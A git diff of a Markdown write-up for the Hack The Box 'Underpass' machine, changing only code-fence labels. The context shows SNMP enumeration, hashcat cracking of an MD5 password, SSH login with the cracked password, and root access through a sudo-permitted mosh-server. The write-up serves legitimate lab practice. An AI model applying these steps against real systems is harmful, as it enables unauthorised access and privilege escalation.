@@ -47,7 +47,7 @@ PORT    STATE SERVICE
 ```
 Let's keep enumerating with *NSE*:
 
-```shell
+```Terminal
 # Nmap 7.94SVN scan initiated Sun Dec 22 10:54:56 2024 as: nmap -sU -p 161 --script=snmp* --min-rate 500 -oN mainSNMPScan underpass.htb
 Nmap scan report for underpass.htb (10.10.11.48)
 Host is up (0.13s latency).
@@ -69,7 +69,7 @@ PORT    STATE SERVICE
 ```
 No, it's not enough, keep enumerating using *snmpbulkwalk*.
 
-```shell
+```Terminal
 machiavelli@machiavelli:~# snmpbulkwalk -c public -v2c underpass.htb
 iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
 iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
@@ -99,7 +99,7 @@ We found an MD5 hashed password and a username.
 
 Cracking the password using *john* or *hashcat*, I'll go with *hashcat*.
 
-```shell
+```Terminal
 machiavelli@machiavelli:~# hashcat -m 0 UserHash /usr/share/wordlists/rockyou.txt
 
 UserHash:crackedPassword        
@@ -126,7 +126,7 @@ Hardware.Mon.#1..: Util: 43%
 
 Then we can use the username with the cracked password to connect over SSH and capture the user.txt:
 
-```shell
+```Terminal
 machiavelli@machiavelli:~# ssh svcMosh@underpass.htb
 svcMosh@underpass.htb's password:
 Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)
@@ -164,7 +164,7 @@ e918adf7ea4b7b3d6b4bc53486f3f81a
 
 The first thing we check while trying to escalate our privileges is `sudo -l`:
 
-```shell
+```Terminal
 svcMosh@underpass:~$ sudo -l
 Matching Defaults entries for svcMosh on localhost:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -175,7 +175,7 @@ svcMosh@underpass:~$
 ```
 When it's your first time facing a new command or service, reading the manual is a good thing:
 
-```shell
+```Terminal
 svcMosh@underpass:~$ man /usr/bin/mosh-server
 
 ***
@@ -188,7 +188,7 @@ DESCRIPTION
 
 Reading the examples will guide you, let's capture the root.txt.
 
-```shell
+```Terminal
 svcMosh@underpass:~$ sudo /usr/bin/mosh-server new -p 61113
 
 MOSH CONNECT 61113 QzOh2gOWZ3672OIDhszC0A
